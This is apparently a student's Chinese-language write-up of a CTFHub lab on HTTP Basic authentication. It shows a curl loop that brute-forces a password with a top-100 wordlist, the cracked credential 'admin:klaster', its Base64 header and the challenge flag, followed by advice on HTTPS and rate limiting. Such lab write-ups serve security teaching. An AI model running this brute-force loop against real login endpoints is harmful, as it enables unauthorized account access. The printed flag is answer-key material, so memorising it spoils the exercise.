# WP：基础认证

> **CTFHub 路径**：技能树 → Web → Web 前置技能 → HTTP 协议 → 基础认证
> **任务**：按题目提示完成 HTTP Basic 认证，拿到 flag。
> **提示**：观察 `401 Unauthorized` 响应和 `WWW-Authenticate: Basic` 响应头。Basic 认证把 `用户名:密码` 做 Base64 编码后放在 `Authorization` 请求头里，Base64 不是加密。
> **截图要求**：能看到 `Authorization: Basic ...` 请求头，以及认证成功后的 flag 或页面。

---

## 题目信息

| 项目 | 内容 |
| --- | --- |
| 环境地址 | http://challenge-d3084932cba923e5.sandbox.ctfhub.com:10800 |
| Flag | ctfhub{7b20d62808caf46d4e605d07} |

## 解题过程

打开靶场首页是一个很简单的页面，正文只有一句 `Here is your flag: click`，指向 `/flag.html`；直接访问 `/flag.html` 时浏览器弹出要求输入用户名和密码的框，说明这个文件被 HTTP Basic 认证保护着。我在 Kali 终端里用 `curl -si` 看未认证的原始响应，拿到 `HTTP/1.1 401 Unauthorized` 和 `WWW-Authenticate: Basic realm="Do u know admin ?"`——realm 里的那句话等于把用户名提示出来了：`admin`。密码没有给，但题目提供了附件，下载解压后是一个 `10_million_password_list_top_100.txt`（常见弱口令 top100），于是我用这个字典对 `/flag.html` 逐个尝试：`curl -o /dev/null -w '%{http_code}' -u "admin:$p"`，只要状态码从 401 变成 200 就说明密码对了，最后命中 `admin:klaster`。带着这对凭据再请求一次，响应体就是 flag；在浏览器里输入同样的用户名密码后，`/flag.html` 也正常显示了这个 flag。

## 关键请求/响应

未认证时被要求认证：

```http
GET /flag.html HTTP/1.1
Host: challenge-d3084932cba923e5.sandbox.ctfhub.com:10800

HTTP/1.1 401 Unauthorized
Server: openresty/1.21.4.2
WWW-Authenticate: Basic realm="Do u know admin ?"
Content-Type: text/html; charset=utf-8
```

用字典爆破（状态码从 401 变 200 即为命中）：

```text
$ while read p; do cred="admin:$p"; curl -s -o /dev/null \
      -w "%{http_code}" -u "$cred" "$U/flag.html" | grep -q 200 \
      && { echo "hit $cred"; break; }; done < top100.txt
hit admin:klaster
```

带上 `Authorization` 请求头认证成功后：

```http
GET /flag.html HTTP/1.1
Host: challenge-d3084932cba923e5.sandbox.ctfhub.com:10800
Authorization: Basic YWRtaW46a2xhc3Rlcg==

HTTP/1.1 200 OK
Server: openresty/1.21.4.2
Content-Type: text/html; charset=utf-8
Content-Length: 33

ctfhub{7b20d62808caf46d4e605d07}
```

> `YWRtaW46a2xhc3Rlcg==` 解出来就是 `admin:klaster`。

## 原理与复盘

Base64 只是编码，不是加密：`YWRtaW46a2xhc3Rlcg==` 用一条 `base64 -d` 就能还原成明文 `admin:klaster`，所以 Basic 认证的安全性完全依赖 HTTPS——在明文 HTTP 上，`Authorization` 头等于把用户名密码裸奔在链路里。这也解释了为什么这道题"提示用户名 + 给字典"就能做出来：认证信息是静态的用户名密码对，没有验证码、没有尝试次数限制，爆破代价极低。防护上应该改用带限速和锁定的登录接口，避免把静态凭据放在 Basic 认证里，并且强制 HTTPS。

---

## 截图

![基础认证](../imgs/lab5_basic_auth.png)

> 可以在这份 WP 中另加过程截图；检查时只看指定图片，额外图片不检查。
